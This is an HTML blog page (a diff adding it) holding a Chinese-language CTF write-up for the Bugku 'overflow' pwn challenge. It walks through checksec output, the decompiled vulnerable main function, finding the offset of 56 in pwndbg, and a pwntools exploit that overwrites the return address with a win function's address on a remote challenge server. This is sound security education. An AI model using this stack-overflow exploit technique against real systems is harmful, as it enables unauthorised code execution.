@@ -1,0 +1,313 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Bugku Overflow Writeups | Hakmaple&#39;s Blog</title>
+  <meta name="author" content="hakmaple">
+  
+  <meta name="description" content="检查文件pwndbg&amp;gt; checksecFile:     /home/zhailin/CTF_Challenges/Pwn/BUGKU/overflow/pwn2Arch:     amd64RELRO:      Partial RELROStack:      No canary foundNX:         NX unknown - GNU_STACK missingPIE:        No PIE (0x400000)Stack:      ExecutableRWX:        Has RWX segmentsStripped:   No
+
+放入IDA Pro中
+int __fastcall main(int argc, const char **argv, const char **envp)&amp;#123;  _BYTE s[48]; // [rsp+0h] [rbp-30h] BYREF  memset(s, 0, sizeof(s));  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&amp;quot;say something?&amp;quot;);  read(0, s, 0x100u);  puts(&amp;quot;oh,that&amp;#x27;s so boring!&amp;quot;);  return 0;&amp;#125;
+
+主函数中定义了一个char类型数组s，首先，memset()函数将char类型数组s的前0x30字节初始化为0，之后，read()函数以s作为缓存区读取了0x100个字节的数据
+我们继续在IDA中寻找，发现存在一个get_shell_()函数，地址为0x400751函数的返回值使用system()函数执行了cat flag命令，这样可以直接得到flag
+
+这样我们就有了思路：输入0x30个字节的数据覆盖s，再输入8个字节的数据覆盖栈底指针rbp，然后将返回值修改为get_shell_()函数的地址
+或者一个更直接的思路，我们在pwndbg中调试，先生成一个长度为200的随机字符串，然后将程序run起来"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Bugku Overflow Writeups"/>
+  <meta property="og:site_name" content="Hakmaple&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Hakmaple&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/cat.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"><link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Hakmaple&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Bugku Overflow Writeups</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="检查文件"><a href="#检查文件" class="headerlink" title="检查文件"></a>检查文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">File:     /home/zhailin/CTF_Challenges/Pwn/BUGKU/overflow/pwn2</span><br><span class="line">Arch:     amd64</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX unknown - GNU_STACK missing</span><br><span class="line">PIE:        No PIE (0x400000)</span><br><span class="line">Stack:      Executable</span><br><span class="line">RWX:        Has RWX segments</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>放入IDA Pro中</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;say something?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x100u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;oh,that&#x27;s so boring!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主函数中定义了一个<code>char</code>类型数组<code>s</code>，首先，<code>memset()</code>函数将char类型数组s的前<code>0x30</code>字节初始化为0，之后，<code>read()</code>函数以s作为缓存区读取了<code>0x100</code>个字节的数据</p>
+<p>我们继续在IDA中寻找，发现存在一个get_shell_()函数，地址为<code>0x400751</code>函数的返回值使用system()函数执行了<code>cat flag</code>命令，这样可以直接得到flag</p>
+<p><img src="/./images/bugku-overflow/1.png" alt="images"></p>
+<p>这样我们就有了思路：输入0x30个字节的数据覆盖s，再输入8个字节的数据覆盖栈底指针<code>rbp</code>，然后将返回值修改为get_shell_()函数的地址</p>
+<p>或者一个更直接的思路，我们在pwndbg中调试，先生成一个长度为200的随机字符串，然后将程序run起来</p>
+<p><img src="/./images/bugku-overflow/2.png" alt="images"></p>
+<p>我们将随机数据输入后程序崩溃，观察到原先的内容都被我们输入的随机数据所覆盖，<code>rsp</code>的地址直接被覆盖为<code>haaaaaaa</code>（换算成Hex是0x6161616161616168），计算得出偏移量是56</p>
+<p><img src="/./images/bugku-overflow/3.png" alt="images"></p>
+<p>Exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn2&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;117.72.52.127&quot;</span>, <span class="number">11909</span>) </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">56</span> + p64(<span class="number">0x400751</span>)</span><br><span class="line">io.recvline(<span class="string">&quot;say something?\n&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2025/09/24/bugku-overflow2-wp/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/09/20/pwndbg-ret2sth/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-09-24 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pwn/">Pwn<span>4</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Pwn/">Pwn<span>4</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 hakmaple's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
